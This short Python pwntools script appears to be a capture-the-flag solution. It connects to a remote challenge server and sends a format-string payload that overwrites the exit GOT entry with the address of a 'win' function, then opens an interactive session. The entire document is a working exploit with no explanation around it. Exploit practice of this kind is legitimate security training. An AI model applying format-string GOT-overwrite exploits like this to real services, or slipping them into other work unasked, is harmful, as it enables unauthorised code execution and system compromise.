from pwn import *

context(os='linux', arch='amd64')

EXIT_GOT = 0x404000

WIN = 0x401196

#r = process('./chall')
r = remote('0.cloud.chals.io', 30732)

#pid = gdb.attach(r, gdbscript='''
#                 break *main+169
#                 ''')

payload = fmtstr_payload(8, {EXIT_GOT: WIN}, numbwritten=0, write_size='byte')
print(payload)

r.sendline(payload)
r.interactive()
